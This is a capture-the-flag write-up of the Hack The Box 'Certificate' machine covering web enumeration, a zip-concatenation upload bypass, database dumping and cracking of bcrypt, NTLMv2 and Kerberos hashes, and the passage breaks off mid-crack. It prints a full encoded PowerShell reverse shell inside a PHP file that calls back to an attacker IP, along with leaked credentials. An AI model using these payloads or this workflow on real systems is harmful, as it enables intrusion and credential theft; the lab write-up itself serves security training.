---
title: Certificate [Hard]
date: 2025-06-02
tags: [htb, windows, zip slip, reverse shell, nmap, evil-winrm, AD, password cracking, certipy, db, bloodhound, SeManageVolumePrivilege, certutil]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/certificate-htb-season8
image: /assets/img/certificate-htb-season8/certificate-htb-season8_banner.png
---

# Certificate HTB Season 8
## Machine information
Author: [Spectra199](https://app.hackthebox.com/users/414823)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.8.163
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-31 23:27 EDT
Nmap scan report for 10.129.8.163
Host is up (0.026s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
|_http-title: Did not follow redirect to http://certificate.htb/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-01 11:28:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-06-01T11:29:27+00:00; +8h00m01s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-06-01T11:29:28+00:00; +8h00m01s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-01T11:29:27+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-06-01T11:29:28+00:00; +8h00m01s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 8h00m00s, deviation: 0s, median: 8h00m00s
| smb2-time: 
|   date: 2025-06-01T11:28:48
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.46 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.8.163 certificate.htb DC01.certificate.htb
```

This time this machine has a web server running on port 80. Let's go through and enumerate it.

### Web Enumeration
Go to `http://certificate.htb`.

![Web Page](/assets/img/certificate-htb-season8/certificate-htb-season8_web_page.png)

So this is a E-learn platform to learn skills and get certificates. Let's register and discover what we can do.

![Register](/assets/img/certificate-htb-season8/certificate-htb-season8_register.png)
![Register](/assets/img/certificate-htb-season8/certificate-htb-season8_register_2.png)

I register with information above and can choose either `student` or `teacher` role.
```bash
Username: test123123
Password: test123123
Email: test123123@gmail.com
```

![Login](/assets/img/certificate-htb-season8/certificate-htb-season8_login.png)
![Login](/assets/img/certificate-htb-season8/certificate-htb-season8_login_2.png)

Guess what!

![Login](/assets/img/certificate-htb-season8/certificate-htb-season8_login_3.png)

Got white blank page, so let's try to enumerate the web server.

### dirsearch & discovery & zip slip
```bash
└─$ dirsearch -u http://certificate.htb/          
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB_Labs/DEPTHS_Season8/Certificate/reports/http_certificate.htb/__25-06-01_04-34-01.txt

Target: http://certificate.htb/

[04:34:01] Starting: 
[04:34:02] 403 -  304B  - /%C0%AE%C0%AE%C0%AF                               
[04:34:02] 403 -  304B  - /%3f/                                             
[04:34:02] 403 -  304B  - /%ff                                              
[04:34:06] 403 -  304B  - /.ht_wsr.txt                                      
[04:34:06] 403 -  304B  - /.htaccess.bak1                                   
[04:34:06] 403 -  304B  - /.htaccess.orig
[04:34:06] 403 -  304B  - /.htaccess.save                                   
[04:34:06] 403 -  304B  - /.htaccess.sample                                 
[04:34:06] 403 -  304B  - /.htaccess_extra
[04:34:06] 403 -  304B  - /.htaccessBAK
[04:34:06] 403 -  304B  - /.htaccess_sc
[04:34:06] 403 -  304B  - /.htaccessOLD                                     
[04:34:06] 403 -  304B  - /.htaccess_orig
[04:34:06] 403 -  304B  - /.htaccessOLD2                                    
[04:34:06] 403 -  304B  - /.htm                                             
[04:34:06] 403 -  304B  - /.html
[04:34:06] 403 -  304B  - /.htpasswd_test                                   
[04:34:06] 403 -  304B  - /.httr-oauth
[04:34:06] 403 -  304B  - /.htpasswds
[04:34:11] 200 -   14KB - /about.php                                        
[04:34:24] 403 -  304B  - /cgi-bin/                                         
[04:34:24] 500 -  638B  - /cgi-bin/printenv.pl                              
[04:34:27] 200 -    0B  - /db.php                                           
[04:34:31] 503 -  404B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/ 
[04:34:31] 503 -  404B  - /examples
[04:34:31] 503 -  404B  - /examples/                                        
[04:34:31] 503 -  404B  - /examples/jsp/index.html
[04:34:31] 503 -  404B  - /examples/jsp/snp/snoop.jsp
[04:34:31] 503 -  404B  - /examples/servlets/servlet/CookieExample          
[04:34:31] 503 -  404B  - /examples/servlet/SnoopServlet
[04:34:31] 503 -  404B  - /examples/servlets/servlet/RequestHeaderExample   
[04:34:31] 503 -  404B  - /examples/servlets/index.html                     
[04:34:31] 503 -  404B  - /examples/websocket/index.xhtml
[04:34:31] 200 -    3KB - /footer.php                                       
[04:34:33] 200 -    2KB - /header.php                                       
[04:34:35] 403 -  304B  - /index.php::$DATA                                 
[04:34:37] 200 -    9KB - /login.php                                        
[04:34:38] 302 -    0B  - /logout.php  ->  login.php                        
[04:34:44] 403 -  423B  - /phpmyadmin                                       
[04:34:45] 403 -  423B  - /phpmyadmin/                                      
[04:34:45] 403 -  423B  - /phpmyadmin/doc/html/index.html                   
[04:34:45] 403 -  423B  - /phpmyadmin/ChangeLog
[04:34:45] 403 -  423B  - /phpmyadmin/docs/html/index.html                  
[04:34:45] 403 -  423B  - /phpmyadmin/index.php
[04:34:45] 403 -  423B  - /phpmyadmin/phpmyadmin/index.php
[04:34:45] 403 -  423B  - /phpmyadmin/README                                
[04:34:45] 403 -  423B  - /phpmyadmin/scripts/setup.php                     
[04:34:48] 200 -   11KB - /register.php                                     
[04:34:51] 403 -  423B  - /server-info                                      
[04:34:51] 403 -  423B  - /server-status                                    
[04:34:51] 403 -  423B  - /server-status/                                   
[04:34:54] 301 -  345B  - /static..  ->  http://certificate.htb/static../   
[04:34:54] 301 -  343B  - /static  ->  http://certificate.htb/static/       
[04:34:57] 403 -  304B  - /Trace.axd::$DATA                                 
[04:34:58] 302 -    0B  - /upload.php  ->  login.php                        
[04:35:01] 403 -  304B  - /web.config::$DATA                                
[04:35:02] 403 -  304B  - /webalizer                                        
[04:35:02] 403 -  304B  - /webalizer/                                       
                                                                             
Task Completed
```

Found that there is a `db.php` file but with `0B` size so it's empty. And there is a endpoint `upload.php` but it will redirect to `login.php`. <br>
Let's go around the website to find where we can upload files.

After a while, I found that when scroll down a little bit, there are some courses.

![Courses](/assets/img/certificate-htb-season8/certificate-htb-season8_courses.png)

I click on the course and it redirects me to `http://certificate.htb/login.php`. So I use the credentials I registered to login and failed, I realized that the credentials I just registered has `teacher` role so I can not login. <br>
&rarr; I register with new account with `student` role and login with the new credentials.

![Courses](/assets/img/certificate-htb-season8/certificate-htb-season8_courses_2.png)

After I login with new account `test123123123`, I can now go to the course page.

![Courses](/assets/img/certificate-htb-season8/certificate-htb-season8_courses_3.png)

Choose this course `http://certificate.htb/course-details.php?id=1`. See that there is a `Enroll the course` button and text field for `Your Feedback`. <br>
&rarr; Turn on `Burp Suite` and test for the text field if we can inject like XSS.

![Feedback](/assets/img/certificate-htb-season8/certificate-htb-season8_feedback.png)

I try with `test` and when I click  `Submit` button, there is nothing happen as we can see from the screenshot above. <br>
So let's `Enroll the course` and see what happen.

![Enroll](/assets/img/certificate-htb-season8/certificate-htb-season8_enroll.png)

Successfully enrolled the course. Let's scroll down and see if there is anything interesting.

![Course Outline](/assets/img/certificate-htb-season8/certificate-htb-season8_course_outline.png)

There is course outline list out `Session` and `Quiz`. The `watch` button does not link to anywhere so I `submit` button for `Quizz-1`.

![Quiz](/assets/img/certificate-htb-season8/certificate-htb-season8_quiz.png)
![Quiz](/assets/img/certificate-htb-season8/certificate-htb-season8_quiz_2.png)

They bring us to `http://certificate.htb/upload.php?s_id=5` and we can see there is `Select File` to `submit`. It only accept these file types: `.pdf .docx .pptx .xlsx` and also the `zip` file. <br>
&rarr; Let's try upload normal `.pdf` file and have little play with `Burp Suite`.

![Upload](/assets/img/certificate-htb-season8/certificate-htb-season8_upload.png)

When I upload a blank `.pdf` file, I can see the result when I click the `HERE` redirect link.

![Upload](/assets/img/certificate-htb-season8/certificate-htb-season8_upload_2.png)

What if I change the file extension to `.php`?

![Upload](/assets/img/certificate-htb-season8/certificate-htb-season8_upload_3.png)

`Bad Request` and it also show that `contains malicious content`. <br>
&rarr; We can not directly upload `.php` file to reverse shell.

What if I zip the `php` file and upload it? <br>
- Create a directory named `files`.
- Create a `reverse.php` file with following content:
```php
<?php
shell_exec("powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAiACwAMQAzADMANwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=");
?>
```
The base64 encoded payload I use from [Reverse Shell Generator](https://www.revshells.com/).

![Upload](/assets/img/certificate-htb-season8/certificate-htb-season8_upload_4.png)

- Then zip the `files` directory and upload it.
```bash
└─$ zip -r mal.zip files/     
  adding: files/ (stored 0%)
  adding: files/reverse.php (deflated 54%)
```

Not working, the attack does not receive any response. <br>
Go through some research and found this concept called [Zip Slip](https://security.snyk.io/research/zip-slip-vulnerability). <br>

What if we combined the normal zip file with normal `pdf` file together with malicious zip with `reverse shell` payload? <br>
Let's zip the `pdf` file.
```bash
└─$ zip legit.zip document.pdf
  adding: document.pdf (deflated 29%)
```

Now then combine the `legit.zip` and `mal.zip` together.
```bash
└─$ cat legit.zip mal.zip > comb.zip
```

On the attacker machine:
```bash
└─$ rlwrap -cAr nc -lvnp 1337       
listening on [any] 1337 ...
```

On the target machine: <br>
- After finish upload `comb.zip` file.
- To trigger the reverse shell, we need to modified the `http://certificate.htb/static/uploads/18c653d9889c21376701ae2c1013be8f/document.pdf` to `http://certificate.htb/static/uploads/18c653d9889c21376701ae2c1013be8f/files/reverse.php`

![Reverse Shell](/assets/img/certificate-htb-season8/certificate-htb-season8_reverse_shell.png)

```bash
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.7] from (UNKNOWN) [10.129.177.210] 54932
whoami
certificate\xamppuser
PS C:\xampp\htdocs\certificate.htb\static\uploads\18c653d9889c21376701ae2c1013be8f\files>
```

BOOM! We get a reverse shell on user `xamppuser`.

## Initial Access
### Discovery
Go through some directory and found some interesting files.
```powershell
PS C:\xampp\htdocs\certificate.htb> dir


    Directory: C:\xampp\htdocs\certificate.htb


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----         6/1/2025  11:17 AM                static                                                                
-a----       12/24/2024  12:45 AM           7179 about.php                                                             
-a----       12/30/2024   1:50 PM          17197 blog.php                                                              
-a----       12/30/2024   2:02 PM           6560 contacts.php                                                          
-a----       12/24/2024   6:10 AM          15381 course-details.php                                                    
-a----       12/24/2024  12:53 AM           4632 courses.php                                                           
-a----       12/23/2024   4:46 AM            549 db.php                                                                
-a----       12/22/2024  10:07 AM           1647 feature-area-2.php                                                    
-a----       12/22/2024  10:22 AM           1331 feature-area.php                                                      
-a----       12/22/2024  10:16 AM           2955 footer.php                                                            
-a----       12/23/2024   5:13 AM           2351 header.php                                                            
-a----       12/24/2024  12:52 AM           9497 index.php                                                             
-a----       12/25/2024   1:34 PM           5908 login.php                                                             
-a----       12/23/2024   5:14 AM            153 logout.php                                                            
-a----       12/24/2024   1:27 AM           5321 popular-courses-area.php                                              
-a----       12/25/2024   1:27 PM           8240 register.php                                                          
-a----       12/28/2024  11:26 PM          10366 upload.php
```

Let's check out `db.php` file.
```powershell
PS C:\xampp\htdocs\certificate.htb> type db.php
<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>
```

Got the credentials for the database. Let's try to connect to the database and see what we can find.

### Database Enumeration
```powershell
PS C:\xampp\htdocs\certificate.htb> C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -pcert!f!c@teDBPWD Certificate_WEBAPP_DB -e "SHOW databases;"
Database
certificate_webapp_db
information_schema
test
```

Let's check out the `certificate_webapp_db` database.
```powershell
PS C:\xampp\htdocs\certificate.htb> C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -pcert!f!c@teDBPWD Certificate_WEBAPP_DB -e "USE certificate_webapp_db;"
PS C:\xampp\htdocs\certificate.htb> C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -pcert!f!c@teDBPWD Certificate_WEBAPP_DB -e "SHOW tables;"
Tables_in_certificate_webapp_db
course_sessions
courses
users
users_courses
```

Check the `users` table.
```powershell
PS C:\xampp\htdocs\certificate.htb> C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -pcert!f!c@teDBPWD Certificate_WEBAPP_DB -e "SELECT * FROM users;"
id      first_name      last_name       username        email   password        created_at      role    is_active
1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10     teacher 1
6       Sara    Laracrof        Sara1200        sara1200@gmail.com      $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK    2024-12-23 12:47:11     teacher 1
7       John    Wood    Johney  johny009@mail.com       $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq    2024-12-23 13:18:18     student 1
8       Havok   Watterson       havokww havokww@hotmail.com     $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti    2024-12-24 09:08:04     teacher 1
9       Steven  Roman   stev    steven@yahoo.com        $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2    2024-12-24 12:05:05     student 1
10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1
12      test123123      test123123      test123123      test123123@gmail.com    $2y$04$qBLsE/60eWdSpET5RnESPO5Nf7rC.TS4FOAnBP6I45rQdPi6YTR3G    2025-06-01 05:34:22     student 1
```

Found out some credentials. The only interesting one is `sara.b` cause it's `admin` role. <br>
&rarr; Let's identify that hash and perform password cracking.

### Password Cracking
I use this website [Hash Identifier](https://hashes.com/en/tools/hash_identifier) to identify the hash type.

![Hash Identifier](/assets/img/certificate-htb-season8/certificate-htb-season8_hash_identifier.png)

It's use `bcrypt` hash. Let's choose `mode` in `hashcat` to perform password cracking.
```bash
└─$ hashcat -h | grep -i bcrypt                                
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
```

The first one is best suit `3200` mode. <br>
```bash
└─$ echo "$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6" > sarab.hash

└─$ hashcat -m 3200 sarab.hash /usr/share/wordlists/rockyou.txt

└─$ hashcat -m 3200 sarab.hash /usr/share/wordlists/rockyou.txt --show
$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6:Blink182
```

Got another credentials `sara.b:Blink182`. <br>
```text
└─$ evil-winrm -i certificate.htb -u "sara.b" -p "Blink182"
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Sara.B\Documents> dir


    Directory: C:\Users\Sara.B\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/4/2024  12:53 AM                WS-01


*Evil-WinRM* PS C:\Users\Sara.B\Documents> cd WS-01
*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> dir


    Directory: C:\Users\Sara.B\Documents\WS-01


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/4/2024  12:44 AM            530 Description.txt
-a----        11/4/2024  12:45 AM         296660 WS-01_PktMon.pcap


*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> type Description.txt
The workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
When a user tries to input bad credentials, it returns bad credentials error.
But when a user provides valid credentials the file explorer freezes and then crashes!
```

Thought that gonna grab the `user.txt` flag but nope :)). <br>
Let's check out the `WS-01_PktMon.pcap` file.
```text
*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> download WS-01_PktMon.pcap
                                        
Info: Downloading C:\Users\Sara.B\Documents\WS-01\WS-01_PktMon.pcap to WS-01_PktMon.pcap
                                        
Info: Download successful!
```

### Wireshark

Open the `WS-01_PktMon.pcap` file on `Wireshark`. Filter out the one that has may contain credentials.
&rarr; Let's go with `ntlmssp`.

![Wireshark](/assets/img/certificate-htb-season8/certificate-htb-season8_wireshark.png)

Found out in `NTLMSSP AUTH` found `NTLMv2`, let's check for it format.

AFter googling, I found this website tell about the format of `NTLMv2` which is quite similar to `NTLMv1`. <br>
&rarr; [NTLMv1 vs NTLMv2](https://www.praetorian.com/blog/ntlmv1-vs-ntlmv2/#:~:text=Unsurprisingly%2C%20the%20NTLMv2%20hash%20format%20is%20very,timestamp%2C%20client%20challenge%2C%20and%20the%20AV_PAIR%20bytes.)

![NTLMv2](/assets/img/certificate-htb-season8/certificate-htb-season8_ntlmv2.png)

What we have: <br>
- `User name` : `Administrator`
- `Domain` : `WS-01`
- `Server challenge` : **Not found yet**
- `Computer response (NTProofStr)` : `3ff29ba4b51e86ed1065c438b6713f28`
- `NTLMv2 Client Challenge` : `3ff29ba4b51e86ed1065c438b6713f2801010000000000000588e3da922edb012a49d5aaa4eeea0c00000000020016004300450052005400490046004900430041005400450001000800440043003000310004001e0063006500720074006900660069006300610074006500`

Need to found the `Server challenge`, following up that request to `TCP Stream`.

![TCP Stream](/assets/img/certificate-htb-season8/certificate-htb-season8_tcp_stream.png)
![TCP Stream](/assets/img/certificate-htb-season8/certificate-htb-season8_tcp_stream_2.png)

Found out the `Server challenge` is `0f18018782d74f81`. <br>

Let's put it all together and crack this hash. <br>
&rarr; `Administrator::WS-01:0f18018782d74f81:3ff29ba4b51e86ed1065c438b6713f28:01010000000000000588e3da922edb012a49d5aaa4eeea0c00000000020016004300450052005400490046004900430041005400450001000800440043003000310004001e0063006500720074006900660069006300610074006500`

```text
└─$ echo "Administrator::WS-01:0f18018782d74f81:3ff29ba4b51e86ed1065c438b6713f28:01010000000000000588e3da922edb012a49d5aaa4eeea0c00000000020016004300450052005400490046004900430041005400450001000800440043003000310004001e0063006500720074006900660069006300610074006500" > administrator.hash

└─$ hashcat -h | grep -i netntlmv2                             
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol

└─$ hashcat -m 5600 administrator.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

...      

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ADMINISTRATOR::WS-01:0f18018782d74f81:3ff29ba4b51e8...006500
Time.Started.....: Tue Jun  3 04:47:49 2025 (34 secs)
Time.Estimated...: Tue Jun  3 04:48:23 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   510.3 kH/s (0.88ms) @ Accel:256 Loops:1 Thr:1 Vec:16
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 61%

Started: Tue Jun  3 04:46:44 2025
Stopped: Tue Jun  3 04:48:24 2025
```

Unable to crack it. Let's look up the `.pcap` file to investigate more. <br>
Let's look for `kerberos` and discover more about it.

![Kerberos](/assets/img/certificate-htb-season8/certificate-htb-season8_kerberos.png)

In Frame 917, there is a `AS-REQ` from `lion.sk` to `certificate.htb`. <br>
```bash
Kerberos
    Record Mark: 305 bytes
        0... .... .... .... .... .... .... .... = Reserved: Not set
        .000 0000 0000 0000 0000 0001 0011 0001 = Record Length: 305
    as-req
        pvno: 5
        msg-type: krb-as-req (10)
        padata: 2 items
            PA-DATA pA-ENC-TIMESTAMP
                padata-type: pA-ENC-TIMESTAMP (2)
                    padata-value: 3041a003020112a23a043823f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
                        etype: eTYPE-AES256-CTS-HMAC-SHA1-96 (18)
                        cipher: 23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
            PA-DATA pA-PAC-REQUEST
                padata-type: pA-PAC-REQUEST (128)
                    padata-value: 3005a0030101ff
                        include-pac: True
        req-body
            Padding: 0
            kdc-options: 40810010
            cname
                name-type: kRB5-NT-PRINCIPAL (1)
                cname-string: 1 item
                    CNameString: Lion.SK
            realm: CERTIFICATE
            sname
                name-type: kRB5-NT-SRV-INST (2)
                sname-string: 2 items
                    SNameString: krbtgt
                    SNameString: CERTIFICATE
            till: Sep 12, 2037 22:48:05.000000000 EDT
            rtime: Sep 12, 2037 22:48:05.000000000 EDT
            nonce: 1788771279
            etype: 6 items
                ENCTYPE: eTYPE-AES256-CTS-HMAC-SHA1-96 (18)
                ENCTYPE: eTYPE-AES128-CTS-HMAC-SHA1-96 (17)
                ENCTYPE: eTYPE-ARCFOUR-HMAC-MD5 (23)
                ENCTYPE: eTYPE-ARCFOUR-HMAC-MD5-56 (24)
                ENCTYPE: eTYPE-ARCFOUR-HMAC-OLD-EXP (-135)
                ENCTYPE: eTYPE-DES-CBC-MD5 (3)
            addresses: 1 item WS-01<20>
                HostAddress WS-01<20>
                    addr-type: nETBIOS (20)
                    NetBIOS Name: WS-01<20> (Server service)
    [Response in: 922]
```

Look for some research about `Kerberos PA-ENC-TIMESTAMP`. <br>
&rarr; `$krb5pa$[etype]$[user]$[realm]$[cipher]`

We got: <br>
- `etype` : `18`
- `user` : `Lion.SK`
- `realm` : `CERTIFICATE.HTB`
- `cipher` : `23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0`

&rarr; `$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0`

Let's try to crack it.
```bash
└─$ hashcat -h | grep -i kerberos                                             
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
```

```text
└─$ hashcat -m 19900 lionsk.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

...

$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QAZ2wsx
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 19900 (Kerberos 5, etype 18, Pre-Auth)
Hash.Target......: $krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7...e852f0
